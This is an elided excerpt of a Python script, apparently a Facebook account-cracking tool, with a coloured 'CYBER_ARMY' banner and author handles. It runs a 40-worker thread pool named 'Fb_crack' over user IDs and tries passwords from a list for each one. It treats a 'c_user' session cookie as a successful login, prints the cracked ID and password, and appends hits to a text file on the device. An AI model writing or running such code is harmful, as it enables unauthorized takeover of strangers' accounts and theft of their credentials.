...
\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mCYBER_ARMY\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] NIROB SHEIKH\033[1;39m            ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] Hello Hacker,s 0.2\033[1;39m   ┃
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] NIROB-VAI\033[1;39m          ┃
...
def Jabers():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m CYBER_𝐊𝐢𝐧𝐠 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m CYBER 𝐀𝐡𝐦𝐞𝐝')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Jaberm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mCYBER_𝐊𝐢𝐧𝐠\033[1;91m]😪[\033[1;92m%s\033[1;91m]💥[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mCYBER_𝐊𝐢𝐧𝐠-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[CYBER_𝐊𝐢𝐧𝐠-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/CYBER_𝐊𝐢𝐧𝐠-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
